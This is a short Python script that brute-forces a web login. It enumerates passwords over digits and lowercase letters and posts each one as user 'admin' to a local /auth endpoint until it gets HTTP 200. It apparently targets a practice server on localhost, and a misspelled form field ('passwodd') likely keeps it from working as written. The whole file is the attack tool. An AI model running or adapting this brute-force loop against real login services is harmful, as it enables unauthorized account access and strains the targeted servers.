import requests


password_index = 0

def get_next_password(symbols):

    global password_index

    index = password_index
    password = ''

    while index > 0:
        rest = index % len(symbols)
        index = index // len(symbols)

        password += symbols[rest]

    password_index += 1
    return password


def main():

    symbols = '0123456789qwertyuiopasdfghjklzxcvbnm'
    status_code = 0

    while status_code != 200:
        password = get_next_password(symbols)
        print(password)
        r = requests.post('http://127.0.0.1:5000/auth', data={'login': 'admin', 'passwodd': password})
        status_code = r.status_code


if __name__ == '__main__':
    main()